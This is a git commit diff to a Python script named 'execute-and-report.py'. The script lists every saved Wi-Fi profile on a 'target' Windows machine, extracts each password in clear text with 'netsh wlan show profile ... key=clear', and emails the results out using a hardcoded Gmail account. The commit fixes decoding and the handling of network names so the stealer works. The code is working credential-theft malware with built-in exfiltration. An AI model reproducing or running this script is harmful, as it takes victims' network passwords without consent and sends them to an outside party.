e6388cba593409d08591e0c5bb90ba4467a344e9
maurya-bitlegacy <72310756+maurya-bitlegacy@users.noreply.github.com>
2021-01-20 22:03:27 +0530

    Update execute-and-report.py

--- report-wifi-passwords/execute-and-report.py
+++ report-wifi-passwords/execute-and-report.py
@@ -10,14 +10,18 @@ def send_mail(email, password, message):
 
 command = "netsh wlan show profile" # Show all networks the target has connected to in the past
 # command can be windows/linux/OsX commands
-networks = subprocess.check_output(command, shell=True)
-network_names = re.findall("(?:Profile\s*:\s)(.*)",networks) # \s* means any no of blank spaces. ?: tells not to include profile in the result. () means groups
+networks = subprocess.check_output(command, shell=True).decode()
+network_names =re.findall("(?:Profile\s*:\s)(.*)",networks) # \s* means any no of blank spaces. ?: tells not to include profile in the result. () means groups
+network_names = list(set(network_names))
+
 # Returns all matching wifi names in a list
-#print(network_names) # Prints a list of all wifi networks ever connected on the target computer
+print(network_names) # Prints a list of all wifi networks ever connected on the target computer
 result = ""
 for network_name in network_names:
+    network_name = network_name.replace('\r','')
+    network_name = f'"{network_name}"' # Add double quotes if there are spaces in the wifi network name
     command = "netsh wlan show profile " + network_name + " key=clear"
-    current_result = subprocess.check_output(command, shell = True)
+    current_result = subprocess.check_output(command, shell = True).decode()
     result = result + current_result
 
 send_mail("dummylegacy69@gmail.com", "dummylegacy1234", result)
